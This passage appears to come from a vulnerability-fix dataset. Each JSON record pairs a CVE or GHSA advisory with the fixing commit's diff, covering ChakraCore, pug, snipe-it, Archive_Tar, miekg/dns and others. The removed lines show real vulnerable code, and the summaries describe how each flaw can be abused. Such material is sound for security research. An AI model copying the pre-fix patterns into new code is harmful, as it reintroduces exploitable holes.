remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-1307, CVE-2019-1308, CVE-2019-1366.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/a4e56547fb8b7450656bfd26dfc52b8477c8ef27","commit_sha":"a4e56547fb8b7450656bfd26dfc52b8477c8ef27","patch":"MULTI","chain_ord":"['a4e56547fb8b7450656bfd26dfc52b8477c8ef27', 'cc871514deeaeaedb5b757c2ca8cd4ab9abccb5d']","before_first_fix_commit":"{'7e9a2ee60baa95ceb4f48f522f823c812ca90c80', '5989c6e038d80f92dcd8e10d725cdf45396201bb'}","last_fix_commit":"cc871514deeaeaedb5b757c2ca8cd4ab9abccb5d","chain_ord_pos":1.0,"commit_datetime":"09\/03\/2019, 21:52:17","message":"CVE-2019-1335","author":"Wyatt","comments":null,"stats":"{'additions': 52, 'deletions': 13, 'total': 65}","files":"{'lib\/Backend\/GlobOpt.cpp': {'additions': 52, 'deletions': 13, 'changes': 65, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/a4e56547fb8b7450656bfd26dfc52b8477c8ef27\/lib%2FBackend%2FGlobOpt.cpp', 'patch': '@@ -2161,27 +2161,46 @@ GlobOpt::CollectMemOpInfo(IR::Instr *instrBegin, IR::Instr *instr, Value *src1Va\\n             return false;\\n         }\\n         break;\\n-    case Js::OpCode::Decr_A:\\n-        isIncr = false;\\n-    case Js::OpCode::Incr_A:\\n-        isChangedByOne = true;\\n-        goto MemOpCheckInductionVariable;\\n     case Js::OpCode::Sub_I4:\\n-    case Js::OpCode::Sub_A:\\n         isIncr = false;\\n-    case Js::OpCode::Add_A:\\n     case Js::OpCode::Add_I4:\\n     {\\n-MemOpCheckInductionVariable:\\n-        StackSym *sym = instr->GetSrc1()->GetStackSym();\\n-        if (!sym)\\n+        \/\/ The only case in which these OpCodes can contribute to an inductionVariableChangeInfo\\n+        \/\/ is when the induction variable is being modified and overwritten aswell (ex: j = j + 1)\\n+        \/\/ and not when the induction variable is modified but not overwritten (ex: k = j + 1).\\n+        \/\/ This can either be detected in IR as\\n+        \/\/ s1     = Add_I4 s1     1  \/\/ Case #1, can be seen with \"j++\".\\n+        \/\/ or as\\n+        \/\/ s4(s2) = Add_I4 s3(s1) 1  \/\/ Case #2, can be see with \"j = j + 1\".\\n+        \/\/ s1     = Ld_A   s2\\n+        bool isInductionVar = false;\\n+        IR::Instr* nextInstr = instr->m_next;\\n+        if (\\n+            \/\/ Checks for Case #1 and Case #2\\n+            instr->GetDst()->GetStackSym() != nullptr &&\\n+            instr->GetDst()->IsRegOpnd() &&\\n+            (\\n+                \/\/ Checks for Case #1\\n+                (instr->GetDst()->GetStackSym() == instr->GetSrc1()->GetStackSym()) ||\\n+\\n+                \/\/ Checks for Case #2\\n+                (nextInstr&& nextInstr->m_opcode == Js::OpCode::Ld_A &&\\n+                 nextInstr->GetSrc1()->IsRegOpnd() &&\\n+                 nextInstr->GetDst()->IsRegOpnd() &&\\n+                 GetVarSymID(instr->GetDst()->GetStackSym()) == nextInstr->GetSrc1()->GetStackSym()->m_id &&\\n+                 GetVarSymID(instr->GetSrc1()->GetStackSym()) == nextInstr->GetDst()->GetStackSym()->m_id)\\n+            )\\n+        )\\n         {\\n-            sym = instr->GetSrc2()->GetStackSym();\\n+            isInductionVar = true;\\n         }\\n+        \\n+        \/\/ Even if dstIsInductionVar then dst == src1 so it\\'s safe to use src1 as the induction sym always.\\n+        StackSym* sym = instr->GetSrc1()->GetStackSym();\\n \\n         SymID inductionSymID = GetVarSymID(sym);\\n \\n-        if (IsSymIDInductionVariable(inductionSymID, this->currentBlock->loop))\\n+        if (isInductionVar && IsSymIDInductionVariable(inductionSymID, this->currentBlock->loop))\\n         {\\n             if (!isChangedByOne)\\n             {\\n@@ -2246,7 +2265,6 @@ GlobOpt::CollectMemOpInfo(IR::Instr *instrBegin, IR::Instr *instr, Value *src1Va\\n                     {\\n                         inductionVariableChangeInfo.unroll++;\\n                     }\\n-                    \\n                     inductionVariableChangeInfo.isIncremental = isIncr;\\n                     loop->memOpInfo->inductionVariableChangeInfoMap->Item(inductionSymID, inductionVariableChangeInfo);\\n                 }\\n@@ -2284,6 +2302,27 @@ GlobOpt::CollectMemOpInfo(IR::Instr *instrBegin, IR::Instr *instr, Value *src1Va\\n             }\\n         }\\n         NEXT_INSTR_IN_RANGE;\\n+        IR::Instr* prevInstr = instr->m_prev;\\n+\\n+        \/\/ If an instr where the dst is an induction variable (and thus is being written to) is not caught by a case in the above\\n+        \/\/ switch statement (which implies that this instr does not contributes to a inductionVariableChangeInfo) and in the default\\n+        \/\/ case does not set doMemOp to false (which implies that this instr does not invalidate this MemOp), then FailFast as we\\n+        \/\/ should not be performing a MemOp under these conditions. \\n+        AssertOrFailFast(!instr->GetDst() || instr->m_opcode == Js::OpCode::IncrLoopBodyCount || !loop->memOpInfo ||\\n+\\n+            \/\/ Refer to \"Case #2\" described above in this function. For the following IR:\\n+            \/\/ Line #1: s4(s2) = Add_I4 s3(s1) 1\\n+            \/\/ Line #2: s3(s1) = Ld_A   s4(s2)\\n+            \/\/ do not consider line #2 as a violating instr\\n+            (instr->m_opcode == Js::OpCode::Ld_I4 &&\\n+                prevInstr && (prevInstr->m_opcode == Js::OpCode::Add_I4 || prevInstr->m_opcode == Js::OpCode::Sub_I4) &&\\n+                instr->GetSrc1()->IsRegOpnd() &&\\n+                instr->GetDst()->IsRegOpnd() &&\\n+                prevInstr->GetDst()->IsRegOpnd() &&\\n+                instr->GetDst()->GetStackSym() == prevInstr->GetSrc1()->GetStackSym() &&\\n+                instr->GetSrc1()->GetStackSym() == prevInstr->GetDst()->GetStackSym()) ||\\n+\\n+            !loop->memOpInfo->inductionVariableChangeInfoMap->ContainsKey(GetVarSymID(instr->GetDst()->GetStackSym())));\\n     }\\n \\n     return true;'}}","message_norm":"cve-2019-1335","language":"ro","entities":"[('cve-2019-1335', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Backend\/GlobOpt.cpp'])","num_files":1.0},{"index":2492,"vuln_id":"GHSA-p2vw-f87c-q597","cwe_id":"{'CWE-863'}","score":6.5,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/2e9cf8fa87a025c0eac9f79f4864b3fdd33a950c'}","dataset":"osv","summary":"Improper Access Control in snipe\/snipe-it Improper Access Control in GitHub repository snipe\/snipe-it prior to 5.4.4.","published_date":"2022-04-29","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/2e9cf8fa87a025c0eac9f79f4864b3fdd33a950c","commit_sha":"2e9cf8fa87a025c0eac9f79f4864b3fdd33a950c","patch":"SINGLE","chain_ord":"['2e9cf8fa87a025c0eac9f79f4864b3fdd33a950c']","before_first_fix_commit":"{'126bb486b5146975f562d51b8f75dd2e30bee74d'}","last_fix_commit":"2e9cf8fa87a025c0eac9f79f4864b3fdd33a950c","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2022, 14:45:37","message":"Added access gate to the requested assets index\n\nSigned-off-by: snipe <snipe@snipe.net>","author":"snipe","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'app\/Http\/Controllers\/Assets\/AssetsController.php': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/2e9cf8fa87a025c0eac9f79f4864b3fdd33a950c\/app%2FHttp%2FControllers%2FAssets%2FAssetsController.php', 'patch': \"@@ -861,6 +861,7 @@ public function auditStore(Request $request, $id)\\n \\n     public function getRequestedIndex($user_id = null)\\n     {\\n+        $this->authorize('index', Asset::class);\\n         $requestedItems = CheckoutRequest::with('user', 'requestedItem')->whereNull('canceled_at')->with('user', 'requestedItem');\\n \\n         if ($user_id) {\"}}","message_norm":"added access gate to the requested assets index\n\nsigned-off-by: snipe <snipe@snipe.net>","language":"en","entities":"[('added', 'ACTION', ''), ('snipe@snipe.net', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Controllers\/Assets\/AssetsController.php'])","num_files":1.0},{"index":2500,"vuln_id":"GHSA-p463-639r-q9g9","cwe_id":"{'CWE-94'}","score":0.0,"chain":"{'https:\/\/github.com\/markevans\/dragonfly\/commit\/a8775aacf9e5c81cf11bec34b7afa7f27ddfe277'}","dataset":"osv","summary":"High severity vulnerability that affects dragonfly The Dragonfly gem 0.7 before 0.8.6 and 0.9.x before 0.9.13 for Ruby, when used with Ruby on Rails, allows remote attackers to execute arbitrary code via a crafted request.","published_date":"2017-10-24","chain_len":1,"project":"https:\/\/github.com\/markevans\/dragonfly","commit_href":"https:\/\/github.com\/markevans\/dragonfly\/commit\/a8775aacf9e5c81cf11bec34b7afa7f27ddfe277","commit_sha":"a8775aacf9e5c81cf11bec34b7afa7f27ddfe277","patch":"SINGLE","chain_ord":"['a8775aacf9e5c81cf11bec34b7afa7f27ddfe277']","before_first_fix_commit":"{'4fb2145b6b5731841e23ecddfa988675b9e194cb'}","last_fix_commit":"a8775aacf9e5c81cf11bec34b7afa7f27ddfe277","chain_ord_pos":1.0,"commit_datetime":"02\/19\/2013, 10:44:17","message":"security update note","author":"Mark Evans","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'README.md': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/markevans\/dragonfly\/raw\/a8775aacf9e5c81cf11bec34b7afa7f27ddfe277\/README.md', 'patch': \"@@ -7,6 +7,8 @@ Ideal for using with Ruby on Rails (2.3 and 3), Sinatra and all that gubbins.\\n \\n However, Dragonfly is NOT JUST FOR RAILS, and NOT JUST FOR IMAGES!!\\n \\n+**IMPORTANT: if you're running a version between 0.7.0 and 0.9.12, please update to 0.9.14 for a security update [details here](https:\/\/groups.google.com\/forum\/?fromgroups=#!topic\/dragonfly-users\/3c3WIU3VQTo)**\\n+\\n For the lazy Rails user...\\n --------------------------\\n **Gemfile**:\"}}","message_norm":"security update note","language":"en","entities":"[('security', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['README.md'])","num_files":1.0},{"index":2502,"vuln_id":"GHSA-p493-635q-r6gr","cwe_id":"{'CWE-74'}","score":6.8,"chain":"{'https:\/\/github.com\/pugjs\/pug\/commit\/991e78f7c4220b2f8da042877c6f0ef5a4683be0'}","dataset":"osv","summary":"Remote code execution via the `pretty` option. ### Impact\n\nIf a remote attacker was able to control the `pretty` option of the pug compiler, e.g. if you spread a user provided object such as the query parameters of a request into the pug template inputs, it was possible for them to achieve remote code execution on the node.js backend.\n\n### Patches\n\nUpgrade to `pug@3.0.1` or `pug-code-gen@3.0.2` or `pug-code-gen@2.0.3`, which correctly sanitise the parameter.\n\n### Workarounds\n\nIf there is no way for un-trusted input to be passed to pug as the `pretty` option, e.g. if you compile templates in advance before applying user input to them, you do not need to upgrade.\n\n### References\n\n\nOriginal report: https:\/\/github.com\/pugjs\/pug\/issues\/3312\n\n### For more information\n\nIf you believe you have found other vulnerabilities, please **DO NOT** open an issue. Instead, you can follow the instructions in our [Security Policy](https:\/\/github.com\/pugjs\/pug\/blob\/master\/SECURITY.md)","published_date":"2021-03-03","chain_len":1,"project":"https:\/\/github.com\/pugjs\/pug","commit_href":"https:\/\/github.com\/pugjs\/pug\/commit\/991e78f7c4220b2f8da042877c6f0ef5a4683be0","commit_sha":"991e78f7c4220b2f8da042877c6f0ef5a4683be0","patch":"SINGLE","chain_ord":"['991e78f7c4220b2f8da042877c6f0ef5a4683be0']","before_first_fix_commit":"{'06baa525a23049756de9587461d389a12bc12537'}","last_fix_commit":"991e78f7c4220b2f8da042877c6f0ef5a4683be0","chain_ord_pos":1.0,"commit_datetime":"02\/28\/2021, 18:21:18","message":"fix: sanitise and escape the `pretty` option (#3314)","author":"Forbes Lindesay","comments":null,"stats":"{'additions': 11, 'deletions': 2, 'total': 13}","files":"{'packages\/pug-code-gen\/index.js': {'additions': 11, 'deletions': 2, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pugjs\/pug\/raw\/991e78f7c4220b2f8da042877c6f0ef5a4683be0\/packages%2Fpug-code-gen%2Findex.js', 'patch': '@@ -57,6 +57,11 @@ function Compiler(node, options) {\\n   if (this.pp && typeof this.pp !== \\'string\\') {\\n     this.pp = \\'  \\';\\n   }\\n+  if (this.pp && !\/^\\\\s+$\/.test(this.pp)) {\\n+    throw new Error(\\n+      \\'The pretty parameter should either be a boolean or whitespace only string\\'\\n+    );\\n+  }\\n   this.debug = false !== options.compileDebug;\\n   this.indents = 0;\\n   this.parentIndents = 0;\\n@@ -452,7 +457,9 @@ Compiler.prototype = {\\n   visitMixinBlock: function(block) {\\n     if (this.pp)\\n       this.buf.push(\\n-        \"pug_indent.push(\\'\" + Array(this.indents + 1).join(this.pp) + \"\\');\"\\n+        \\'pug_indent.push(\\' +\\n+          stringify(Array(this.indents + 1).join(this.pp)) +\\n+          \\');\\'\\n       );\\n     this.buf.push(\\'block && block();\\');\\n     if (this.pp) this.buf.push(\\'pug_indent.pop();\\');\\n@@ -504,7 +511,9 @@ Compiler.prototype = {\\n       this.mixins[key].used = true;\\n       if (pp)\\n         this.buf.push(\\n-          \"pug_indent.push(\\'\" + Array(this.indents + 1).join(pp) + \"\\');\"\\n+          \\'pug_indent.push(\\' +\\n+            stringify(Array(this.indents + 1).join(pp)) +\\n+            \\');\\'\\n         );\\n       if (block || attrs.length || attrsBlocks.length) {\\n         this.buf.push(name + \\'.call({\\');'}}","message_norm":"fix: sanitise and escape the `pretty` option (#3314)","language":"en","entities":"[('sanitise', 'SECWORD', ''), ('escape', 'SECWORD', ''), ('#3314', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['packages\/pug-code-gen\/index.js'])","num_files":1.0},{"index":2508,"vuln_id":"GHSA-p4v2-r99v-wjc2","cwe_id":"{'CWE-116'}","score":7.5,"chain":"{'https:\/\/github.com\/nicotine-plus\/nicotine-plus\/commit\/0e3e2fac27a518f0a84330f1ddf1193424522045'}","dataset":"osv","summary":"Improper Encoding or Escaping of Output in Nicotine+ Denial of service (DoS) vulnerability in Nicotine+ starting with version 3.0.3 and prior to version 3.2.1 allows a user with a modified Soulseek client to crash Nicotine+ by sending a file download request with a file path containing a null character.","published_date":"2022-03-16","chain_len":1,"project":"https:\/\/github.com\/nicotine-plus\/nicotine-plus","commit_href":"https:\/\/github.com\/nicotine-plus\/nicotine-plus\/commit\/0e3e2fac27a518f0a84330f1ddf1193424522045","commit_sha":"0e3e2fac27a518f0a84330f1ddf1193424522045","patch":"SINGLE","chain_ord":"['0e3e2fac27a518f0a84330f1ddf1193424522045']","before_first_fix_commit":"{'aabfa856bd57bcf986c2ea296457986e83c0c98b'}","last_fix_commit":"0e3e2fac27a518f0a84330f1ddf1193424522045","chain_ord_pos":1.0,"commit_datetime":"12\/22\/2021, 18:49:21","message":"Handle invalid file paths in file download requests\n\nFixes #1777","author":"mathiascode","comments":null,"stats":"{'additions': 13, 'deletions': 4, 'total': 17}","files":"{'pynicotine\/shares.py': {'additions': 13, 'deletions': 4, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nicotine-plus\/nicotine-plus\/raw\/0e3e2fac27a518f0a84330f1ddf1193424522045\/pynicotine%2Fshares.py', 'patch': '@@ -609,13 +609,22 @@ def load_shares(cls, shares, dbs, reset_shares=False):\\n \\n     def file_is_shared(self, user, virtualfilename, realfilename):\\n \\n-        log.add_transfer(\"Checking if file %(virtual_name)s with real path %(path)s is shared\", {\\n+        log.add_transfer(\"Checking if file is shared: %(virtual_name)s with real path %(path)s\", {\\n             \"virtual_name\": virtualfilename,\\n             \"path\": realfilename\\n         })\\n \\n-        if not os.access(realfilename, os.R_OK):\\n-            log.add_transfer(\"Can\\'t access file %(virtual_name)s with real path %(path)s, not sharing\", {\\n+        try:\\n+            if not os.access(realfilename, os.R_OK):\\n+                log.add_transfer(\"Cannot access file, not sharing: %(virtual_name)s with real path %(path)s\", {\\n+                    \"virtual_name\": virtualfilename,\\n+                    \"path\": realfilename\\n+                })\\n+                return False\\n+\\n+        except Exception:\\n+            log.add_transfer((\"Requested file path contains invalid characters or other errors, not sharing: \"\\n+                              \"%(virtual_name)s with real path %(path)s\"), {\\n                 \"virtual_name\": virtualfilename,\\n                 \"path\": realfilename\\n             })\\n@@ -643,7 +652,7 @@ def file_is_shared(self, user, virtualfilename, realfilename):\\n                 if file == fileinfo[0]:\\n                     return True\\n \\n-        log.add_transfer(\"Failed to share file %(virtual_name)s with real path %(path)s, since it wasn\\'t found\", {\\n+        log.add_transfer(\"Failed to share file, since it wasn\\'t found: %(virtual_name)s with real path %(path)s\", {\\n             \"virtual_name\": virtualfilename,\\n             \"path\": realfilename\\n         })'}}","message_norm":"handle invalid file paths in file download requests\n\nfixes #1777","language":"en","entities":"[('fixes', 'ACTION', ''), ('#1777', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['pynicotine\/shares.py'])","num_files":1.0},{"index":2511,"vuln_id":"GHSA-p55x-7x9v-q8m4","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/miekg\/dns\/commit\/43913f2f4fbd7dcff930b8a809e709591e4dd79e'}","dataset":"osv","summary":"Denial of Service in miekg-dns A denial of service flaw was found in miekg-dns before 1.0.4. A remote attacker could use carefully timed TCP packets to block the DNS server from accepting new connections.","published_date":"2021-06-29","chain_len":1,"project":"https:\/\/github.com\/miekg\/dns","commit_href":"https:\/\/github.com\/miekg\/dns\/commit\/43913f2f4fbd7dcff930b8a809e709591e4dd79e","commit_sha":"43913f2f4fbd7dcff930b8a809e709591e4dd79e","patch":"SINGLE","chain_ord":"['43913f2f4fbd7dcff930b8a809e709591e4dd79e']","before_first_fix_commit":"{'862243b3b1e77ca9f73771fc95a7148d11cebb55'}","last_fix_commit":"43913f2f4fbd7dcff930b8a809e709591e4dd79e","chain_ord_pos":1.0,"commit_datetime":"01\/25\/2018, 10:36:19","message":"Fix for CVE-2017-15133 TCP DOS (#631)\n\nserveTCP calls reader.ReadTCP in the accept loop rather than in\r\nthe per-connection goroutine. If an attacker opens a connection\r\nand leaves it idle, this will block the accept loop until the\r\nconnection times out (2s by default). During this time no other\r\nincoming connections will succeed, preventing legitimate queries\r\nfrom being answered.\r\n\r\nThis commit moves the call to reader.ReadTCP into the per-connection\r\ngoroutine. It also adds a missing call to Close whose absence allowed\r\nfile-descirptors to leak in select cases.\r\n\r\nThis attack and fix have no impact on serving UDP queries.","author":"Miek Gieben","comments":null,"stats":"{'additions': 8, 'deletions': 5, 'total': 13}","files":"{'server.go': {'additions': 8, 'deletions': 5, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/miekg\/dns\/raw\/43913f2f4fbd7dcff930b8a809e709591e4dd79e\/server.go', 'patch': '@@ -472,11 +472,14 @@ func (srv *Server) serveTCP(l net.Listener) error {\\n \\t\\t\\t}\\n \\t\\t\\treturn err\\n \\t\\t}\\n-\\t\\tm, err := reader.ReadTCP(rw, rtimeout)\\n-\\t\\tif err != nil {\\n-\\t\\t\\tcontinue\\n-\\t\\t}\\n-\\t\\tgo srv.serve(rw.RemoteAddr(), handler, m, nil, nil, rw)\\n+\\t\\tgo func() {\\n+\\t\\t\\tm, err := reader.ReadTCP(rw, rtimeout)\\n+\\t\\t\\tif err != nil {\\n+\\t\\t\\t\\trw.Close()\\n+\\t\\t\\t\\treturn\\n+\\t\\t\\t}\\n+\\t\\t\\tsrv.serve(rw.RemoteAddr(), handler, m, nil, nil, rw)\\n+\\t\\t}()\\n \\t}\\n }'}}","message_norm":"fix for cve-2017-15133 tcp dos (#631)\n\nservetcp calls reader.readtcp in the accept loop rather than in\r\nthe per-connection goroutine. if an attacker opens a connection\r\nand leaves it idle, this will block the accept loop until the\r\nconnection times out (2s by default). during this time no other\r\nincoming connections will succeed, preventing legitimate queries\r\nfrom being answered.\r\n\r\nthis commit moves the call to reader.readtcp into the per-connection\r\ngoroutine. it also adds a missing call to close whose absence allowed\r\nfile-descirptors to leak in select cases.\r\n\r\nthis attack and fix have no impact on serving udp queries.","language":"en","entities":"[('fix', 'ACTION', ''), ('cve-2017-15133', 'VULNID', 'CVE'), ('dos', 'SECWORD', ''), ('#631', 'ISSUE', ''), ('attacker', 'SECWORD', ''), ('preventing', 'ACTION', ''), ('adds', 'ACTION', ''), ('leak', 'SECWORD', ''), ('attack', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['server.go'])","num_files":1.0},{"index":2534,"vuln_id":"GHSA-p885-prv3-m4xv","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/f211c11034baf4281aa62e7b5e0347248d995ee9'}","dataset":"osv","summary":"Cross-site Scripting in snipe-it Stored Cross Site Scripting vulnerability in Item name parameter in GitHub repository snipe\/snipe-it prior to v5.4.3. The vulnerability is capable of stolen the user Cookie.","published_date":"2022-04-17","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/f211c11034baf4281aa62e7b5e0347248d995ee9","commit_sha":"f211c11034baf4281aa62e7b5e0347248d995ee9","patch":"SINGLE","chain_ord":"['f211c11034baf4281aa62e7b5e0347248d995ee9']","before_first_fix_commit":"{'698c7f4904f8fd843c5b9761053c9c68819ec288', '7479f5f12d73f73d9bc8c479651e0e5602ad1791'}","last_fix_commit":"f211c11034baf4281aa62e7b5e0347248d995ee9","chain_ord_pos":1.0,"commit_datetime":"04\/15\/2022, 11:25:56","message":"Merge pull request #10942 from snipe\/fixes\/xss_user_requested\n\nFixes potential XSS vuln in user requestable results","author":"snipe","comments":null,"stats":"{'additions': 5, 'deletions': 5, 'total': 10}","files":"{'app\/Http\/Controllers\/Api\/ProfileController.php': {'additions': 5, 'deletions': 5, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/f211c11034baf4281aa62e7b5e0347248d995ee9\/app%2FHttp%2FControllers%2FApi%2FProfileController.php', 'patch': \"@@ -30,11 +30,11 @@ public function requestedAssets()\\n             \/\/ Make sure the asset and request still exist\\n             if ($checkoutRequest && $checkoutRequest->itemRequested()) {\\n                 $results['rows'][] = [\\n-                    'image' => $checkoutRequest->itemRequested()->present()->getImageUrl(),\\n-                    'name' => $checkoutRequest->itemRequested()->present()->name(),\\n-                    'type' => $checkoutRequest->itemType(),\\n-                    'qty' => $checkoutRequest->quantity,\\n-                    'location' => ($checkoutRequest->location()) ? $checkoutRequest->location()->name : null,\\n+                    'image' => e($checkoutRequest->itemRequested()->present()->getImageUrl()),\\n+                    'name' => e($checkoutRequest->itemRequested()->present()->name()),\\n+                    'type' => e($checkoutRequest->itemType()),\\n+                    'qty' => (int) $checkoutRequest->quantity,\\n+                    'location' => ($checkoutRequest->location()) ? e($checkoutRequest->location()->name) : null,\\n                     'expected_checkin' => Helper::getFormattedDateObject($checkoutRequest->itemRequested()->expected_checkin, 'datetime'),\\n                     'request_date' => Helper::getFormattedDateObject($checkoutRequest->created_at, 'datetime'),\\n                 ];\"}}","message_norm":"merge pull request #10942 from snipe\/fixes\/xss_user_requested\n\nfixes potential xss vuln in user requestable results","language":"ca","entities":"[('#10942', 'ISSUE', ''), ('xss_user_requested', 'SECWORD', ''), ('fixes', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Controllers\/Api\/ProfileController.php'])","num_files":1.0},{"index":2537,"vuln_id":"GHSA-p8q8-jfcv-g2h2","cwe_id":"{'CWE-59'}","score":7.1,"chain":"{'https:\/\/github.com\/pear\/Archive_Tar\/commit\/7789ebb2f34f9e4adb3a4152ad0d1548930a9755', 'https:\/\/github.com\/pear\/Archive_Tar\/commit\/b5832439b1f37331fb4f87e67fe4f61ca26bf7d4'}","dataset":"osv","summary":"Directory Traversal in Archive_Tar In Archive_Tar before 1.4.14, symlinks can refer to targets outside of the extracted archive, a different vulnerability than CVE-2020-36193.","published_date":"2021-08-09","chain_len":2,"project":"https:\/\/github.com\/pear\/Archive_Tar","commit_href":"https:\/\/github.com\/pear\/Archive_Tar\/commit\/b5832439b1f37331fb4f87e67fe4f61ca26bf7d4","commit_sha":"b5832439b1f37331fb4f87e67fe4f61ca26bf7d4","patch":"MULTI","chain_ord":"['b5832439b1f37331fb4f87e67fe4f61ca26bf7d4', '7789ebb2f34f9e4adb3a4152ad0d1548930a9755']","before_first_fix_commit":"{'8c00f3c220655961dc3f869f37005794ab3e3500', '4d761c5334c790e45ef3245f0864b8955c562caa'}","last_fix_commit":"7789ebb2f34f9e4adb3a4152ad0d1548930a9755","chain_ord_pos":1.0,"commit_datetime":"07\/18\/2021, 15:21:58","message":"Properly fix symbolic link path traversal (CVE-2021-32610)","author":"Michiel Rook","comments":null,"stats":"{'additions': 29, 'deletions': 21, 'total': 50}","files":"{'Archive\/Tar.php': {'additions': 29, 'deletions': 21, 'changes': 50, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pear\/Archive_Tar\/raw\/b5832439b1f37331fb4f87e67fe4f61ca26bf7d4\/Archive%2FTar.php', 'patch': '@@ -2124,39 +2124,47 @@ public function _extractList(\\n                             }\\n                         }\\n                     } elseif ($v_header[\\'typeflag\\'] == \"2\") {\\n+                        if (!$p_symlinks) {\\n+                            $this->_warning(\\'Symbolic links are not allowed. \\'\\n+                                . \\'Unable to extract {\\'\\n+                                . $v_header[\\'filename\\'] . \\'}\\'\\n+                            );\\n+                            return false;\\n+                        }\\n+                        $absolute_link = FALSE;\\n                         $link_depth = 0;\\n-                        foreach (explode(\"\/\", $v_header[\\'filename\\']) as $dir) {\\n-                            if ($dir === \"..\") {\\n-                                $link_depth--;\\n-                            } elseif ($dir !== \"\" && $dir !== \".\" ) {\\n-                                $link_depth++;\\n-                            }\\n+                        if (strpos($v_header[\\'link\\'], \"\/\") === 0 || strpos($v_header[\\'link\\'], \\':\\') !== FALSE) {\\n+                          $absolute_link = TRUE;\\n                         }\\n-                        foreach (explode(\"\/\", $v_header[\\'link\\']) as $dir){\\n-                            if ($link_depth <= 0) {\\n-                                break;\\n+                        else {\\n+                            $s_filename = preg_replace(\\'@^\\' . preg_quote($p_path) . \\'@\\', \"\", $v_header[\\'filename\\']);\\n+                            $s_linkname = str_replace(\\'\\\\\\\\\\', \\'\/\\', $v_header[\\'link\\']);\\n+                            foreach (explode(\"\/\", $s_filename) as $dir) {\\n+                                if ($dir === \"..\") {\\n+                                    $link_depth--;\\n+                                } elseif ($dir !== \"\" && $dir !== \".\" ) {\\n+                                    $link_depth++;\\n+                                }\\n                             }\\n-                            if ($dir === \"..\") {\\n-                                $link_depth--;\\n-                            } elseif ($dir !== \"\" && $dir !== \".\") {\\n-                                $link_depth++;\\n+                            foreach (explode(\"\/\", $s_linkname) as $dir){\\n+                                if ($link_depth <= 0) {\\n+                                    break;\\n+                                }\\n+                                if ($dir === \"..\") {\\n+                                    $link_depth--;\\n+                                } elseif ($dir !== \"\" && $dir !== \".\") {\\n+                                    $link_depth++;\\n+                                }\\n                             }\\n                         }\\n-                        if (strpos($v_header[\\'link\\'], \"\/\") === 0 or $link_depth <= 0) {\\n+                        if ($absolute_link || $link_depth <= 0) {\\n                             $this->_error(\\n                                  \\'Out-of-path file extraction {\\'\\n                                  . $v_header[\\'filename\\'] . \\' --> \\' .\\n                                  $v_header[\\'link\\'] . \\'}\\'\\n                             );\\n                             return false;\\n                         }\\n-                        if (!$p_symlinks) {\\n-                            $this->_warning(\\'Symbolic links are not allowed. \\'\\n-                                . \\'Unable to extract {\\'\\n-                                . $v_header[\\'filename\\'] . \\'}\\'\\n-                            );\\n-                            return false;\\n-                        }\\n                         if (@file_exists($v_header[\\'filename\\'])) {\\n                             @unlink($v_header[\\'filename\\']);\\n                         }'}}","message_norm":"properly fix symbolic link path traversal (cve-2021-32610)","language":"en","entities":"[('fix', 'ACTION', ''), ('path traversal', 'SECWORD', ''), ('cve-2021-32610', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['Archive\/Tar.php'])","num_files":1.0},{"index":2539,"vuln_id":"GHSA-p92x-r36w-9395","cwe_id":"{'CWE-843'}","score":5.6,"chain":"{'https:\/\/github.com\/aheckmann\/mpath\/commit\/89402d2880d4ea3518480a8c9847c541f2d824fc'}","dataset":"osv","summary":"Type confusion in mpath This affects the package mpath before 0.8.4. A type confusion vulnerability can lead to a bypass of CVE-2018-16490. In particular, the condition ignoreProperties.indexOf(parts[i]) !== -1 returns -1 if parts[i] is ['__proto__']. This is because the method that has been called if the input is an array is Array.prototype.indexOf() and not String.prototype.indexOf(). They behave differently depending on the type of the 